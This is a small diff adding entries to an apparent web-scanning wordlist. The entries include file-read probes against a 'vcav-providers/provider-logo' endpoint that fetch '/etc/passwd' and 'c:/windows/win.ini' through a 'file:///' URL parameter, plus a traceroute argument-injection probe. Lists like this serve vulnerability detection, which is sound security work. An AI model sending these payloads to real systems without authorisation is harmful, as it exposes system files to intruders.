@@ -4,3 +4,9 @@
 /execute_js
 /html
 /volume/stream/Rmx1aWc=/{{base64(
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
+/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
+/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///etc/passwd
+/vsphere-client/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file%3a///c%3a/windows/win.ini
+/bird?q=x
+/traceroute?q=--help
